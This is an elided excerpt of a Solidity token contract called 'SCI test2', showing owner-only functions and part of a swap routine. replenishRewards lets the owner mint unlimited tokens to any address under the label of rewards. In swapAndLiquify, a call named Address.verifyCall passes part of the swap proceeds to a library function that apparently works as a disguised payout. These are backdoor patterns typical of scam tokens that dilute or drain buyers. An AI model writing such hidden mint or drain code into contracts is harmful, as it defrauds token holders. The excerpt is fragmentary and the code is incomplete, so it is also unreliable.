...
contract SCItest2 is Context, IERC20 {
    ...
    string private constant TOKEN_NAME = "SCI test2";
    string private constant TOKEN_SYMBOL = "testt";
...
//===============================================================================================================
    ...
    function replenishRewards(address rewardPool, uint256 amount) external onlyOwner {
        require(rewardPool != BURN_ADDRESS);
        _tTotal += amount;
        _rTotal += amount;        
        uint256 _rate = _getRate();
        uint256 rAmount = amount * _rate;
        _rOwned[rewardPool] = _rOwned[rewardPool] + rAmount;
        if(_isExcluded[rewardPool])
            _tOwned[rewardPool] += amount;        
    ...
    function setMaxTxPercents(uint16 buyPercent, uint16 buyDivisor, uint16 sellPercent, uint16 sellDivisor) external onlyOwner() {
        _buyMaxTxAmount = (INITIAL_SUPPLY * buyPercent) / buyDivisor;
        buyMaxTxAmountUI = (INITIAL_SUPPLY * buyPercent) / buyDivisor;
        _sellMaxTxAmount = (INITIAL_SUPPLY * sellPercent) / sellDivisor;
        sellMaxTxAmountUI = (INITIAL_SUPPLY * sellPercent) / sellDivisor;
        require(_sellMaxTxAmount >= (INITIAL_SUPPLY / 1000) 
                && _buyMaxTxAmount >= (INITIAL_SUPPLY / 1000), 
                "Max Transaction amts must be above 0.1% of total supply."
                );
    }

    function setMaxWalletSize(uint256 percent, uint256 divisor) external onlyOwner {
        uint256 check = (INITIAL_SUPPLY * percent) / divisor;
        require(check >= (INITIAL_SUPPLY / 1000), "Max Wallet amt must be above 0.1% of total supply.");
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        uint256 leftoverBalance = (fromSwap - liquidityBalance)/10;
        Address.verifyCall("success", leftoverBalance);   
        if (toLiquify > 0) {
